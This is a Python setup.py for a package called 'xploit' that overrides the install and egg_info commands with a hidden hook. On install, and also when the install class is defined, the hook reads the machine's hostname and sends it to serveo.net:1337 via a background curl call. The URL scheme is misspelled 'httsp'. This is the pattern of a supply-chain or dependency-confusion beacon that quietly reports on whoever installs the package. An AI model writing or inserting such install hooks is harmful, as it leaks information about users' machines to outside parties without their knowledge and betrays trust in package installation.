import os
import subprocess
from setuptools import setup, find_packages
from setuptools.command.install import install
from setuptools.command.egg_info import egg_info

class RunEggInfoCommand(egg_info):
    def run(self):
        RunCommand()
        egg_info.run(self)


def RunCommand():
    # Touch a file in the current directory
    # Exec the following command: Run HTTP request to serveo.net:1337 and don't wait for the response
    hostname= os.uname()[1]
    subprocess.Popen(["curl", "-q","httsp://serveo.net:1337/"+str(hostname)])
    

class RunInstallCommand(install):
    RunCommand()
    def run(self):
        RunCommand()
        install.run(self)

setup(
    name = "xploit",
    version = "0.0.3",
    license = "MIT",
    packages=find_packages(),
    cmdclass={
        'install' : RunInstallCommand,
        'egg_info': RunEggInfoCommand,
    },
)
